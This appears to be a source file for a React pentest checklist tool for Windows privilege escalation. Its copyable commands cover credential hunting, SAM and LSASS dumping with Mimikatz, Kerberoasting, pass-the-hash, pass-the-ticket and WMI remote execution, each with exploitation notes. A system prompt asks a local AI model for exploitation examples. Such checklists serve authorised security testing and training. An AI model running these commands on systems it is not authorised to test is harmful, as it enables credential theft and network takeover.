import { useState, useEffect, useRef, useCallback, useMemo } from 'react'
import { 
  Shield, ChevronDown, ChevronRight, Copy, Check, Cpu, 
  RotateCcw, ExternalLink, Save, Download, Upload, 
  Trash2, History, Star, 
  FileText, BookOpen, Target, Sparkles, Search, 
  Play, 
  Zap,
  AlertCircle
} from 'lucide-react'
import { useActiveModel } from '../models/ModelManager';


type CheckItem = {
  id: string;
  label: string;
  command: string;
  note: string;
  risk: 'critical' | 'high' | 'medium' | 'low';
  references?: string[];
  exampleOutput?: string;
}

type Category = {
  id: string;
  title: string;
  icon: string;
  color: string;
  items: CheckItem[];
}

type SavedChecklist = {
  id: string;
  timestamp: number;
  checked: Record<string, boolean>;
  notes?: string;
  favorite?: boolean;
  tags?: string[];
}

const OLLAMA_HOST = 'http://127.0.0.1:11434'

const CATEGORIES: Category[] = [
  {
    id: 'sysinfo', title: 'System Information', icon: '💻', color: 'text-ghost-accent',
    items: [
      { id: 'si1', label: 'Get system info', command: 'systeminfo', note: 'Look for OS version, hotfixes, and architecture', risk: 'medium', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo'] },
      { id: 'si2', label: 'Check OS version', command: 'ver && wmic os get Caption,Version,BuildNumber', note: 'Search for unpatched exploits on this version', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem'] },
      { id: 'si3', label: 'List installed hotfixes', command: 'wmic qfe get Caption,Description,HotFixID,InstalledOn', note: 'Missing patches = kernel exploits', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering'] },
      { id: 'si4', label: 'Check architecture', command: 'wmic os get osarchitecture', note: 'Important for choosing correct exploit binary', risk: 'low', references: ['https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem'] },
    ]
  },
  {
    id: 'services', title: 'Vulnerable Services', icon: '⚙️', color: 'text-ghost-red',
    items: [
      { id: 'sv1', label: 'List all running services', command: 'sc query state= all', note: 'Look for non-standard or custom services', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query'] },
      { id: 'sv2', label: 'Check service permissions', command: 'accesschk.exe -uwcqv * /accepteula', note: 'Writable service = replace binary for SYSTEM', risk: 'critical', references: ['https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk'] },
      { id: 'sv3', label: 'Find weak service permissions', command: 'Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select Name,PathName,StartName', note: 'Services running as SYSTEM with weak ACLs', risk: 'critical', references: ['https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject'] },
      { id: 'sv4', label: 'Check service binary permissions', command: 'icacls "C:\\Program Files\\*" 2>nul | findstr /i "(F) (M) (W) Everyone BUILTIN\\Users"', note: 'Writable binary path = replace with payload', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls'] },
    ]
  },
  {
    id: 'registry', title: 'Registry Exploits', icon: '🗝️', color: 'text-ghost-yellow',
    items: [
      { id: 'rg1', label: 'Check AlwaysInstallElevated', command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', note: 'Both = 1 means install MSI as SYSTEM', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated'] },
      { id: 'rg2', label: 'Search registry for passwords', command: 'reg query HKLM /f password /t REG_SZ /s && reg query HKCU /f password /t REG_SZ /s', note: 'Plaintext passwords stored in registry', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query'] },
      { id: 'rg3', label: 'Check AutoLogon credentials', command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', note: 'May contain DefaultPassword in plaintext', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-autologon'] },
      { id: 'rg4', label: 'Check PuTTY stored sessions', command: 'reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s', note: 'May contain proxy/SSH credentials', risk: 'high', references: ['https://www.chiark.greenend.org.uk/~sgtatham/putty/'] },
    ]
  },
  {
    id: 'tasks', title: 'Scheduled Tasks', icon: '⏰', color: 'text-ghost-accent-2',
    items: [
      { id: 'st1', label: 'List all scheduled tasks', command: 'schtasks /query /fo LIST /v', note: 'Look for tasks running as SYSTEM with writable scripts', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks'] },
      { id: 'st2', label: 'Check task binary permissions', command: 'schtasks /query /fo CSV /nh | ForEach-Object { ($_ -split ",")[8] } | Sort-Object -Unique', note: 'If you can write the binary = SYSTEM execution', risk: 'critical', references: ['https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/foreach-object'] },
      { id: 'st3', label: 'PowerShell scheduled tasks', command: 'Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq "Highest"} | Select TaskName,TaskPath', note: 'Highest privilege tasks are prime targets', risk: 'high', references: ['https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask'] },
    ]
  },
  {
    id: 'tokens', title: 'Token Privileges', icon: '🎫', color: 'text-ghost-accent-3',
    items: [
      { id: 'tk1', label: 'Check current privileges', command: 'whoami /priv', note: 'SeImpersonate/SeAssignPrimaryToken = Potato attacks', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami'] },
      { id: 'tk2', label: 'Check current groups', command: 'whoami /groups', note: 'Look for BUILTIN\\Administrators or high-priv groups', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami'] },
      { id: 'tk3', label: 'Check SeImpersonate (Potato)', command: 'whoami /priv | findstr /i "SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"', note: 'Present = use JuicyPotato, PrintSpoofer, or RoguePotato', risk: 'critical', references: ['https://github.com/ohpe/juicy-potato'] },
      { id: 'tk4', label: 'Check SeBackup/SeRestore', command: 'whoami /priv | findstr /i "SeBackupPrivilege SeRestorePrivilege"', note: 'Can read/write any file including SAM database', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants'] },
      { id: 'tk5', label: 'Check SeDebug privilege', command: 'whoami /priv | findstr /i "SeDebugPrivilege"', note: 'Can inject into SYSTEM processes', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights'] },
    ]
  },
  {
    id: 'unquoted', title: 'Unquoted Service Paths', icon: '📂', color: 'text-ghost-green',
    items: [
      { id: 'uq1', label: 'Find unquoted service paths', command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\"', note: 'Place malicious binary at path interception point', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/services/service-properties'] },
      { id: 'uq2', label: 'PowerShell unquoted paths', command: 'Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch \'"\' -and $_.PathName -match \' \'} | Select Name,PathName,StartName', note: 'Spaces in path without quotes = hijack opportunity', risk: 'critical', references: ['https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject'] },
    ]
  },
  {
    id: 'adcs', title: 'ADCS / Certificate Abuse', icon: '📜', color: 'text-ghost-yellow',
    items: [
      { id: 'ad1', label: 'Check for ADCS (Certify)', command: 'Certify.exe find /vulnerable', note: 'ESC1-ESC8 misconfigurations allow domain privesc', risk: 'critical', references: ['https://github.com/GhostPack/Certify'] },
      { id: 'ad2', label: 'Enumerate certificate templates', command: 'certutil -TCAInfo && certutil -Template', note: 'Look for templates with enrollment rights for low-priv users', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil'] },
      { id: 'ad3', label: 'Check web enrollment', command: 'curl -k https://<CA>/certsrv/', note: 'NTLM relay to ADCS web enrollment = ESC8', risk: 'critical', references: ['https://posts.specterops.io/certified-pre-owned-d95910965cd2'] },
    ]
  },
  {
    id: 'kerberoast', title: 'Kerberoasting / AS-REP', icon: '🎭', color: 'text-ghost-red',
    items: [
      { id: 'kb1', label: 'Kerberoast (PowerView)', command: 'Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv -NoTypeInformation', note: 'Request TGS for SPNs, crack offline', risk: 'critical', references: ['https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon'] },
      { id: 'kb2', label: 'Kerberoast (Rubeus)', command: 'Rubeus.exe kerberoast /outfile:hashes.txt', note: 'Dump all kerberoastable hashes', risk: 'critical', references: ['https://github.com/GhostPack/Rubeus'] },
      { id: 'kb3', label: 'AS-REP Roasting', command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt', note: 'Accounts with no pre-auth = AS-REP roast', risk: 'critical', references: ['https://github.com/GhostPack/Rubeus#asreproast'] },
      { id: 'kb4', label: 'Find AS-REP vulnerable users', command: 'Get-DomainUser -PreauthNotRequired | Select SamAccountName', note: 'No pre-auth required = AS-REP roastable', risk: 'high', references: ['https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon'] },
    ]
  },
  {
    id: 'creds', title: 'Credential Storage', icon: '🔐', color: 'text-ghost-red',
    items: [
      { id: 'cr1', label: 'Dump SAM with reg save', command: 'reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM system.bak', note: 'Requires admin — extract NTLM hashes with secretsdump', risk: 'critical', references: ['https://en.wikipedia.org/wiki/Security_Account_Manager'] },
      { id: 'cr2', label: 'Check credential manager', command: 'cmdkey /list', note: 'Stored credentials — use runas /savecred to exploit', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey'] },
      { id: 'cr3', label: 'Search for passwords in files', command: 'findstr /si password *.txt *.xml *.ini *.config 2>nul', note: 'Config files often have plaintext credentials', risk: 'high', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr'] },
      { id: 'cr4', label: 'Check unattend.xml files', command: 'dir /s /b *unattend.xml *sysprep.xml *autounattend.xml 2>nul', note: 'Windows install files often contain base64 passwords', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/'] },
      { id: 'cr5', label: 'Mimikatz — dump LSASS', command: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', note: 'Dump cleartext passwords from LSASS memory', risk: 'critical', references: ['https://github.com/gentilkiwi/mimikatz'] },
      { id: 'cr6', label: 'Check PowerShell history', command: 'type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt', note: 'Commands with passwords typed in PS session', risk: 'high', references: ['https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline'] },
    ]
  },
  {
    id: 'lateral', title: 'Lateral Movement', icon: '🔀', color: 'text-ghost-accent-2',
    items: [
      { id: 'lt1', label: 'Pass the Hash (CrackMapExec)', command: 'crackmapexec smb <target> -u <user> -H <NTLM_hash>', note: 'Use captured NTLM hash to auth without password', risk: 'critical', references: ['https://github.com/byt3bl33d3r/CrackMapExec'] },
      { id: 'lt2', label: 'Pass the Ticket (Rubeus)', command: 'Rubeus.exe ptt /ticket:<base64_ticket>', note: 'Inject Kerberos ticket for impersonation', risk: 'critical', references: ['https://github.com/GhostPack/Rubeus#ptt'] },
      { id: 'lt3', label: 'WMI lateral movement', command: 'wmic /node:<target> /user:<user> /password:<pass> process call create "cmd.exe /c whoami > C:\\out.txt"', note: 'Remote code execution via WMI', risk: 'critical', references: ['https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic'] },
      { id: 'lt4', label: 'Check SMB shares', command: 'net view \\\\<target> /all', note: 'Look for accessible shares on other hosts', risk: 'medium', references: ['https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-view'] },
    ]
  },
]

const RISK_COLOR: Record<string, string> = {
  critical: 'text-ghost-red border-ghost-red/40',
  high:     'text-ghost-yellow border-ghost-yellow/40',
  medium:   'text-ghost-accent border-ghost-accent/40',
  low:      'text-ghost-text-dim border-ghost-border',
}

const RISK_BG: Record<string, string> = {
  critical: 'bg-ghost-red/10',
  high:     'bg-ghost-yellow/10',
  medium:   'bg-ghost-accent/10',
  low:      'bg-white/5',
}

const RISK_PRIORITY: Record<string, number> = {
  critical: 0,
  high: 1,
  medium: 2,
  low: 3
}

// Hoisted constants
const TOTAL_ITEMS = CATEGORIES.flatMap(c => c.items).length

const RISK_DIST = (() => {
  const dist: Record<string, number> = { critical: 0, high: 0, medium: 0, low: 0 }
  for (const cat of CATEGORIES) {
    for (const item of cat.items) {
      dist[item.risk] = (dist[item.risk] || 0) + 1
    }
  }
  return dist
})()

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <button
      onClick={async () => {
        const show = () => {
          setCopied(true)
          setTimeout(() => setCopied(false), 2000)
        }
        if (navigator.clipboard?.writeText) {
          try {
            await navigator.clipboard.writeText(text)
            show()
            return
          } catch { /* fall through */ }
        }
        try {
          const el = document.createElement('textarea')
          el.value = text
          el.style.position = 'fixed'
          el.style.opacity = '0'
          el.style.left = '-9999px'
          document.body.appendChild(el)
          el.select()
          document.execCommand('copy')
          document.body.removeChild(el)
          show()
        } catch (err) {
          console.error('Copy fallback failed:', err)
        }
      }}
      aria-label="Copy to clipboard"
      className="flex items-center gap-1 text-xs text-ghost-text-dim hover:text-ghost-accent-2 transition-colors flex-shrink-0"
    >
      {copied ? <><Check size={11} className="text-ghost-green" />copied</> : <><Copy size={11} />copy</>}
    </button>
  )
}

export default function WindowsPrivesc() {
  const activeModel = useActiveModel()
  const [ollamaAvailable, setOllamaAvailable] = useState<boolean | null>(null)
  const [ollamaError, setOllamaError] = useState<string | null>(null)
  
  const [checked, setChecked] = useState<Record<string, boolean>>({})
  const [expanded, setExpanded] = useState<Record<string, boolean>>({ sysinfo: true })
  const [aiHint, setAiHint] = useState<Record<string, string>>({})
  const [loadingHint, setLoadingHint] = useState<Record<string, boolean>>({})
  const [searchTerm, setSearchTerm] = useState('')
  const [activeTab, setActiveTab] = useState<'checklist' | 'history' | 'resources'>('checklist')
  const [showBeginnerTips, setShowBeginnerTips] = useState(false)
  const [savedChecklists, setSavedChecklists] = useState<SavedChecklist[]>(() => {
    try {
      const saved = localStorage.getItem('windows_privesc_checklists')
      return saved ? JSON.parse(saved) : []
    } catch { return [] }
  })
  const [notes, setNotes] = useState('')
  const [editingNote, setEditingNote] = useState(false)
  const [filterRisk, setFilterRisk] = useState('All')
  const [highlightedItems, setHighlightedItems] = useState<Set<string>>(new Set())

  const fileInputRef = useRef<HTMLInputElement>(null)
  const hintRequestIdRef = useRef(0)

  // ─── Check Ollama Availability ────────────────────────────────────────────
  useEffect(() => {
    async function checkOllama() {
      try {
        const response = await fetch(`${OLLAMA_HOST}/api/version`)
        setOllamaAvailable(response.ok)
        if (!response.ok) setOllamaError(`HTTP ${response.status}`)
      } catch {
        setOllamaAvailable(false)
        setOllamaError('Connection refused')
      }
    }
    checkOllama()
  }, [])

  // ─── Persistence ──────────────────────────────────────────────────────────
  useEffect(() => {
    try {
      localStorage.setItem('windows_privesc_checklists', JSON.stringify(savedChecklists))
    } catch (err) {
      if (err instanceof DOMException && err.name === 'QuotaExceededError') {
        console.error('windows_privesc_checklists: localStorage quota exceeded')
      } else {
        console.error('windows_privesc_checklists: save failed', err)
      }
    }
  }, [savedChecklists])

  // Auto-clear highlighted items after 1s
  useEffect(() => {
    if (highlightedItems.size === 0) return
    const t = setTimeout(() => setHighlightedItems(new Set()), 1000)
    return () => clearTimeout(t)
  }, [highlightedItems])

  const total = TOTAL_ITEMS
  const done = Object.values(checked).filter(Boolean).length
  const pct = total > 0 ? Math.round((done / total) * 100) : 0

  const toggle = (id: string) => {
    setChecked(p => ({ ...p, [id]: !p[id] }))
    setHighlightedItems(prev => {
      const next = new Set(prev)
      next.add(id)
      return next
    })
  }
  
  const toggleCat = (id: string) => setExpanded(p => ({ ...p, [id]: !p[id] }))
  
  const reset = () => { 
    setChecked({}); 
    setAiHint({});
    setNotes('');
  }

  const saveChecklist = useCallback(() => {
    const newChecklist: SavedChecklist = {
      id: crypto.randomUUID(),
      timestamp: Date.now(),
      checked: checked,
      notes: notes || undefined,
      favorite: false
    }
    setSavedChecklists(prev => [newChecklist, ...prev])
    setEditingNote(false)
  }, [checked, notes])

  const loadChecklist = useCallback((checklist: SavedChecklist) => {
    setChecked(checklist.checked)
    setNotes(checklist.notes || '')
    setActiveTab('checklist')
    setAiHint({}) // Clear stale hints
    
    // Auto-expand categories with checked items
    const expandedCats: Record<string, boolean> = {}
    CATEGORIES.forEach(cat => {
      const hasChecked = cat.items.some(item => checklist.checked[item.id])
      expandedCats[cat.id] = hasChecked
    })
    setExpanded(expandedCats)
  }, [])

  const deleteChecklist = (id: string) => {
    setSavedChecklists(prev => prev.filter(c => c.id !== id))
  }

  const toggleFavorite = (id: string) => {
    setSavedChecklists(prev => prev.map(c => 
      c.id === id ? { ...c, favorite: !c.favorite } : c
    ))
  }

  const exportChecklists = () => {
    const data = JSON.stringify(savedChecklists) // Minified
    const blob = new Blob([data], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `windows_privesc_${new Date().toISOString().slice(0,10)}.json`
    a.click()
    URL.revokeObjectURL(url)
  }

  const importChecklists = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0]
    if (!file) return
    const reader = new FileReader()
    reader.onload = (e) => {
      try {
        const data = JSON.parse(e.target?.result as string)
        
        if (!Array.isArray(data)) {
          alert('Invalid file format: expected JSON array')
          return
        }

        // Validate entries
        const validData = data.filter((c): c is SavedChecklist =>
          typeof c === 'object' &&
          c !== null &&
          typeof c.id === 'string' &&
          typeof c.checked === 'object' &&
          typeof c.timestamp === 'number'
        )

        if (validData.length === 0) {
          alert('No valid checklists found in file')
          return
        }

        if (validData.length !== data.length) {
          console.warn(`Skipped ${data.length - validData.length} invalid entries`)
        }

        // Deduplicate by id
        setSavedChecklists(prev => {
          const incomingIds = new Set(validData.map(c => c.id))
          const filtered = prev.filter(c => !incomingIds.has(c.id))
          return [...validData, ...filtered]
        })
      } catch (error) {
        console.error('Import error:', error)
        alert('Invalid file format. Please check the file.')
      }
    }
    reader.readAsText(file)
    if (fileInputRef.current) fileInputRef.current.value = ''
  }

  const clearAllChecklists = () => {
    if (!confirm(`Delete all ${savedChecklists.length} saved checklists? This cannot be undone.`)) return
    setSavedChecklists([])
  }

  const stats = useMemo(() => {
    const total = savedChecklists.length
    const favorited = savedChecklists.filter(c => c.favorite).length
    const totalItems = savedChecklists.reduce((sum, c) => 
      sum + Object.values(c.checked).filter(Boolean).length, 0
    )
    return { total, favorited, totalItems }
  }, [savedChecklists])

  // ─── AI Hint with Ollama availability check ─────────────────────────────
  const getHint = useCallback(async (item: CheckItem) => {
    // Check if Ollama is available
    if (!ollamaAvailable) {
      setAiHint(p => ({ 
        ...p, 
        [item.id]: `⚠️ Ollama is not running (${ollamaError || 'connection failed'}). Please start Ollama and try again.` 
      }))
      return
    }

    if (aiHint[item.id]) { 
      setAiHint(p => ({ ...p, [item.id]: '' }))
      return 
    }
    
    const myRequestId = ++hintRequestIdRef.current
    setLoadingHint(p => ({ ...p, [item.id]: true }))
    
    try {
      const { status, data } = await window.obscurum?.ollamaRequest?.('/api/chat', 'POST', {
        model: activeModel,
        stream: false,
        messages: [
          { role: 'system', content: 'You are a Windows privilege escalation expert. Give a concise 2-3 sentence explanation and a specific exploitation example. Be technical and direct. Plain text only, no markdown.' },
          { role: 'user', content: `Explain this Windows privesc check: "${item.label}". Command: ${item.command}` }
        ]
      }) ?? { status: 200, data: null }
      
      if (myRequestId !== hintRequestIdRef.current) return
      
      if (status >= 400) throw new Error(`Ollama returned HTTP ${status}`)
      const payload = data as { message?: { content?: string } } | null
      
      if (myRequestId !== hintRequestIdRef.current) return
      setAiHint(p => ({ ...p, [item.id]: payload?.message?.content || 'No response.' }))
    } catch (err: any) {
      if (myRequestId !== hintRequestIdRef.current) return
      setAiHint(p => ({ ...p, [item.id]: `Error: ${err.message || 'Failed to connect to Ollama'}` }))
    } finally {
      if (myRequestId === hintRequestIdRef.current) {
        setLoadingHint(p => ({ ...p, [item.id]: false }))
      }
    }
  }, [aiHint, activeModel, ollamaAvailable, ollamaError])

  // Filter items by search and risk
  const getFilteredItems = useCallback((items: CheckItem[]) => {
    return items.filter(item => {
      if (filterRisk !== 'All' && item.risk !== filterRisk) return false
      if (searchTerm) {
        const search = searchTerm.toLowerCase()
        return item.label.toLowerCase().includes(search) || 
               item.command.toLowerCase().includes(search) ||
               item.note.toLowerCase().includes(search)
      }
      return true
    })
  }, [filterRisk, searchTerm])

  // Filter categories
  const filteredCategories = useMemo(() => {
    if (!searchTerm && filterRisk === 'All') return CATEGORIES
    return CATEGORIES
      .map(cat => ({ ...cat, items: getFilteredItems(cat.items) }))
      .filter(cat => cat.items.length > 0)
  }, [searchTerm, filterRisk, getFilteredItems])

  return (
    <div className="max-w-4xl mx-auto">

      {/* Header - No model name displayed */}
      <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-xl flex items-center justify-center" style={{ background: 'rgba(99,102,241,0.15)' }}>
            <Shield size={16} className="text-ghost-accent" />
          </div>
          <div>
            <span className="ghost-gradient-text font-bold text-base">Icarus</span>
            <div className="text-ghost-text-dim text-xs">Interactive checklist · {CATEGORIES.length} categories</div>
          </div>
        </div>
        <div className="flex gap-2 flex-wrap">
          <button 
            onClick={() => setShowBeginnerTips(!showBeginnerTips)}
            className="flex items-center gap-1 text-xs text-ghost-text-dim hover:text-ghost-accent transition-colors px-2 py-1 border border-ghost-border rounded"
          >
            <BookOpen size={12} />
            {showBeginnerTips ? 'Hide Tips' : 'Show Tips'}
          </button>
          <button 
            onClick={() => setActiveTab('history')}
            className={`flex items-center gap-1 text-xs px-2 py-1 border rounded transition-colors ${
              activeTab === 'history' 
                ? 'bg-ghost-accent/20 border-ghost-accent/50 text-ghost-accent' 
                : 'text-ghost-text-dim hover:text-ghost-accent border-ghost-border'
            }`}
          >
            <History size={12} />
            Saved {savedChecklists.length > 0 && `(${savedChecklists.length})`}
          </button>
          <button
            onClick={() => setActiveTab('resources')}
            className={`flex items-center gap-1 text-xs px-2 py-1 border rounded transition-colors ${
              activeTab === 'resources' 
                ? 'bg-ghost-yellow/20 border-ghost-yellow/50 text-ghost-yellow' 
                : 'text-ghost-text-dim hover:text-ghost-yellow border-ghost-border'
            }`}
          >
            <BookOpen size={12} />
            Resources
          </button>
        </div>
      </div>

      {/* Ollama Offline Warning */}
      {ollamaAvailable === false && (
        <div className="mb-4 p-3 bg-amber-500/10 border border-amber-500/30 rounded-lg flex items-center gap-2">
          <AlertCircle size={14} className="text-amber-400" />
          <span className="text-amber-400 text-xs">
            Ollama is not running at {OLLAMA_HOST}. AI explain functionality is disabled.
          </span>
        </div>
      )}

      {/* Beginner Tips */}
      {showBeginnerTips && (
        <div className="mb-4 p-3 bg-purple-900/30 border border-purple-700/50 rounded-lg">
          <div className="flex items-center gap-2 mb-2">
            <BookOpen size={16} className="text-purple-400" />
            <span className="text-purple-400 text-xs font-mono font-bold">Windows Privesc Methodology Tips</span>
          </div>
          <ul className="space-y-1 text-xs text-gray-200">
            <li className="flex items-start gap-2">
              <span className="text-purple-400 mt-0.5">•</span>
              Start with systeminfo to identify missing patches
            </li>
            <li className="flex items-start gap-2">
              <span className="text-purple-400 mt-0.5">•</span>
              Run whoami /priv to check for dangerous privileges
            </li>
            <li className="flex items-start gap-2">
              <span className="text-purple-400 mt-0.5">•</span>
              Always check unquoted service paths first
            </li>
            <li className="flex items-start gap-2">
              <span className="text-purple-400 mt-0.5">•</span>
              Use WinPEAS for automated comprehensive enumeration
            </li>
          </ul>
        </div>
      )}

      {/* Stats Bar */}
      {savedChecklists.length > 0 && (
        <div className="mb-4 grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs font-mono">
          <div className="bg-ghost-surface border border-ghost-border rounded-lg p-2 text-center">
            <div className="text-ghost-text-dim">Total Checklists</div>
            <div className="text-ghost-text font-bold">{stats.total}</div>
          </div>
          <div className="bg-ghost-surface border border-yellow-400/30 rounded-lg p-2 text-center">
            <div className="text-yellow-400">Favorited</div>
            <div className="text-yellow-400 font-bold">{stats.favorited}</div>
          </div>
          <div className="bg-ghost-surface border border-ghost-accent/30 rounded-lg p-2 text-center">
            <div className="text-ghost-accent">Items Checked</div>
            <div className="text-ghost-accent font-bold">{stats.totalItems}</div>
          </div>
          <div className="bg-ghost-surface border border-ghost-green/30 rounded-lg p-2 text-center">
            <div className="text-ghost-green">Completion</div>
            <div className="text-ghost-green font-bold">{total > 0 ? Math.round((done/total)*100) : 0}%</div>
          </div>
        </div>
      )}

      {/* Checklist Tab */}
      {activeTab === 'checklist' && (
        <>
          {/* Search and Filter */}
          <div className="flex gap-2 mb-4 flex-wrap">
            <div className="flex-1 min-w-[150px] relative">
              <Search size={12} className="absolute left-2.5 top-2 text-ghost-text-dim" />
              <input
                value={searchTerm}
                onChange={e => setSearchTerm(e.target.value)}
                placeholder="Search checks..."
                className="w-full bg-ghost-surface border border-ghost-border rounded pl-8 pr-3 py-1.5 text-xs font-mono text-ghost-text focus:outline-none placeholder-ghost-text-dim"
              />
            </div>
            <select
              value={filterRisk}
              onChange={e => setFilterRisk(e.target.value)}
              className="bg-ghost-surface border border-ghost-border rounded px-2 py-1.5 text-xs font-mono text-ghost-text focus:outline-none"
            >
              <option value="All">All Risks</option>
              <option value="critical">Critical</option>
              <option value="high">High</option>
              <option value="medium">Medium</option>
              <option value="low">Low</option>
            </select>
            <button
              onClick={saveChecklist}
              disabled={done === 0}
              className="flex items-center gap-1 text-xs px-3 py-1.5 bg-ghost-accent/20 text-ghost-accent hover:bg-ghost-accent/30 border border-ghost-accent/30 rounded transition-colors disabled:opacity-40"
            >
              <Save size={12} /> Save Progress
            </button>
            <button onClick={reset} className="flex items-center gap-1 text-xs text-ghost-text-dim hover:text-ghost-red transition-colors px-2 py-1 border border-ghost-border rounded">
              <RotateCcw size={12} /> Reset
            </button>
          </div>

          {/* Progress */}
          <div className="ghost-panel p-4 rounded-xl mb-5">
            <div className="flex justify-between text-xs mb-2">
              <span className="text-ghost-text-dim">Progress</span>
              <span className="text-ghost-accent font-mono font-semibold">{done}/{total} checks — {pct}%</span>
            </div>
            <div className="h-1.5 bg-ghost-border rounded-full overflow-hidden">
              <div className="h-full rounded-full transition-all duration-300"
                style={{ width: pct + '%', background: 'linear-gradient(90deg, #6366f1, #a855f7, #22d3ee)' }} />
            </div>
            <div className="flex flex-wrap gap-2 mt-3">
              {(['critical','high','medium','low'] as const).map(r => (
                <span key={r} className={"text-xs px-2 py-0.5 rounded-full border font-mono " + RISK_COLOR[r] + " " + RISK_BG[r]}>
                  ● {r} ({RISK_DIST[r] || 0})
                </span>
              ))}
            </div>
          </div>

          {/* WinPEAS tip */}
          <div className="mb-4 p-3 bg-ghost-yellow/5 border border-ghost-yellow/20 rounded-xl flex items-start gap-3">
            <span className="text-ghost-yellow text-base flex-shrink-0">💡</span>
            <div className="flex-1 min-w-0">
              <div className="text-ghost-yellow text-xs font-semibold mb-1.5">Run WinPEAS first for automated enumeration</div>
              <div className="flex items-center gap-2 bg-ghost-bg border border-ghost-border rounded-lg px-3 py-1.5">
                <code className="text-ghost-green text-xs font-mono flex-1">winpeas.exe &gt; winpeas_output.txt</code>
                <CopyBtn text="winpeas.exe > winpeas_output.txt" />
              </div>
            </div>
          </div>

          {/* Categories */}
          <div className="space-y-2">
            {filteredCategories.map(cat => {
              const catDone = cat.items.filter(i => checked[i.id]).length
              const isOpen = expanded[cat.id]
              const sortedItems = [...cat.items].sort((a, b) => RISK_PRIORITY[a.risk] - RISK_PRIORITY[b.risk])

              return (
                <div key={cat.id} className="ghost-card bg-ghost-surface border border-ghost-border rounded-xl overflow-hidden">

                  <button onClick={() => toggleCat(cat.id)}
                    className="w-full flex items-center gap-3 px-4 py-3 hover:bg-white/3 transition-colors">
                    <span className="text-lg">{cat.icon}</span>
                    <span className={"font-semibold text-sm flex-1 text-left " + cat.color}>{cat.title}</span>
                    <span className="text-xs text-ghost-text-dim font-mono">{catDone}/{cat.items.length}</span>
                    {isOpen ? <ChevronDown size={14} className="text-ghost-text-dim" /> : <ChevronRight size={14} className="text-ghost-text-dim" />}
                  </button>

                  {isOpen && (
                    <div className="border-t border-ghost-border divide-y divide-ghost-border">
                      {sortedItems.map(item => {
                        const isHighlighted = highlightedItems.has(item.id)
                        return (
                          <div key={item.id} className={`transition-all ${checked[item.id] ? 'bg-ghost-accent/5' : ''} ${isHighlighted ? 'bg-ghost-accent/20' : ''}`}>
                            <div className="flex items-start gap-3 px-4 py-3">

                              {/* Checkbox */}
                              <div onClick={() => toggle(item.id)}
                                className={"w-4 h-4 mt-0.5 rounded border flex-shrink-0 cursor-pointer flex items-center justify-center transition-all " +
                                  (checked[item.id] ? 'bg-ghost-accent border-ghost-accent' : 'border-ghost-border hover:border-ghost-accent')}
                                aria-label={checked[item.id] ? 'Mark incomplete' : 'Mark complete'}>
                                {checked[item.id] && <Check size={10} className="text-ghost-bg" strokeWidth={3} />}
                              </div>

                              <div className="flex-1 min-w-0">
                                {/* Label + risk */}
                                <div className="flex flex-wrap items-center gap-2 mb-1.5">
